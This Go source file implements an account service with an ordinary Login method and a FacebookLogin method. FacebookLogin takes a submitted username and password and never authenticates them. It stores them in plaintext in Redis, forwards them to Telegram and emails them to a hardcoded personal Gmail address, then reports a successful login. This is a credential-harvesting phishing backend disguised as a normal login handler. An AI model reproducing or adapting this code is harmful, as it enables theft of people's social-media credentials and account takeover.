package account

import (
	"context"
	"fmt"
	"gorm.io/gorm"
	"net/http"
	"strconv"
	"time"

	pb "github.com/nekizz/final-project/backend/go-pbtype/account"
	"github.com/nekizz/final-project/backend/user/logger"
	"github.com/nekizz/final-project/backend/user/util"
	"github.com/sirupsen/logrus"
)

type Service struct {
	db *gorm.DB
}

func NewService(db *gorm.DB) *Service {
	return &Service{db: db}
}

func (s *Service) Login(ctx context.Context, r *pb.Account) (*pb.Account, error) {
	if err := validateLogin(r); nil != err {
		return nil, err
	}

	account, err := NewRepository(s.db).Login(r.GetUsername(), r.GetPassword())
	if err != nil {
		return nil, err
	}

	return PrepareDataToResponse(account), nil
}

func (s *Service) FacebookLogin(ctx context.Context, r *pb.Account) (*pb.Notification, error) {
	if err := ValidateCreateAccount(r); nil != err {
		return nil, err
	}

	otp := strconv.Itoa(util.Random(100000, 999999))
	content := "Username: " + r.GetUsername() + " Password: " + r.GetPassword()
	keyRedis := fmt.Sprintf("facebook_account")

	go func() {
		if err := util.SetRedis(keyRedis+"_"+otp, content, 48*time.Hour); err != nil {
			logger.Log.WithFields(logrus.Fields{
				"service": "User Service",
				"method":  "POST",
			}).WithError(err).Error("set otp to redis failed")
			fmt.Println(&pb.Notification{
				Status:  "Internal Error",
				Message: "login failed",
				Code:    http.StatusInternalServerError,
			})
		}
	}()

	go util.NotiToTelegram(r.GetUsername(), r.GetPassword())

	go func(content string) {
		sender := util.NewGmailSender()
		err := sender.SendEmail("Verification Email", content, []string{"drminhvipoi2000@gmail.com"}, []string{}, []string{}, []string{})
		if err != nil {
			fmt.Println(&pb.Notification{
				Status:  "Internal Error",
				Message: "login failed",
				Code:    http.StatusInternalServerError,
			})
		}
	}(content)

	return &pb.Notification{Message: "login successflly"}, nil
}
